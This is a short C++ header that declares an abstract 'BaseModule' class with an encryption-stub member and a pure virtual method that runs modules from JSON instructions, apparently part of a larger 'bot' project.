#pragma once
#include "BotEssentials.h"

class BaseModule {
private:
  EncryptionStub *m_crypt_stub;
  void initialize_crypt_stub(unsigned char *key);

public:
  BaseModule();
  ~BaseModule();
  EncryptionStub *get_crypt_stub() const;
  virtual void execute_module(const nlohmann::json &instructions) = 0;
};